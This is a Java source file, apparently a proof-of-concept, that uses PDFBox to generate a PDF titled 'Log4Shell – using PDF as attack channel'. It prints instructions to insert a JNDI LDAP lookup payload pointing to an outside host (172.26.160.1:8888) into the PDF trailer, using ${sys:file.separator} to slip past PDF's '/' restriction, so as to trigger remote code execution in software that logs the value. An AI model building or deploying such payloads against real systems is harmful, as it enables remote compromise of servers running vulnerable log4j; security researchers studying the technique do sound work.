package org.sandbox.util;

import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.PDPageContentStream;
import org.apache.pdfbox.pdmodel.font.PDType1Font;

import java.io.IOException;
import java.nio.file.Paths;

public class GeneratePDF {

    public static void main(String[] args) throws IOException {
        if(args.length == 0) {
            System.out.println("Please provide the destination of generated PDF file");
            System.exit(1);
        }
        System.out.println("Generating the PDF file template.\n" +
                "Using any editor, modify the last '/Size 8' entry and add the JNDI url (e.g.):\n" +
                "/Size ${jndi:ldap:${sys:file.separator}${sys:file.separator}172.26.160.1:8888${sys:file.separator}RCE}\n\n" +
                "Note: The '/' is a reserved character in PDF specifications\n");
        generate(args[0]);
        System.out.println("File was generated: " + Paths.get(args[0]).toFile().getAbsolutePath());
    }

    private static void generate(String destination) throws IOException {
        PDDocument document = new PDDocument();
        PDPage page = new PDPage();
        document.addPage(page);

        PDPageContentStream contentStream = new PDPageContentStream(document, page);

        contentStream.setFont(PDType1Font.COURIER, 24);
        contentStream.beginText();
        contentStream.newLineAtOffset(50, 750);
        contentStream.showText("Log4Shell");
        contentStream.endText();
        contentStream.setFont(PDType1Font.COURIER, 12);
        contentStream.beginText();
        contentStream.newLineAtOffset(50, 730);
        contentStream.showText("using PDF as attack channel");
        contentStream.endText();
        contentStream.close();

        document.save(destination);
        document.close();
    }
}
